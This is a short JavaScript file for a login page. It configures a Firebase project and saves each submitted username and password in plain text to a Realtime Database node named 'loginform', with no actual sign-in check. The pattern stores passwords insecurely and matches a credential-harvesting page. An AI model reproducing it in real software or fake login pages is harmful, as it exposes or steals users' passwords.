const firebaseConfig = {
  apiKey: "AIzaSyDAWjQvvdGumKlyeAEsFXPTONG0NwFYIO0",
  authDomain: "loginpage-92086.firebaseapp.com",
  databaseURL: "https://loginpage-92086-default-rtdb.firebaseio.com",
  projectId: "loginpage-92086",
  storageBucket: "loginpage-92086.appspot.com",
  messagingSenderId: "967958512906",
  appId: "1:967958512906:web:abd7a83f9201908d7fa6f3",
  measurementId: "G-WLZHQVB1JB"
};


firebase.initializeApp(firebaseConfig);
var loginformDB = firebase.database().ref("loginform");


document.getElementById("login").addEventListener("submit", submitForm);

function submitForm(e){
    e.preventDefault();

    var username = getElementVal("username");
    var password = getElementVal("password");

    saveMessages(username, password);
}

const saveMessages = (username, password) => {
    var newContactForm = loginformDB.push();

    newContactForm.set({
        username : username,
        password : password,
    })
}

const getElementVal = (id) => {
    return document.getElementById(id).value;
}


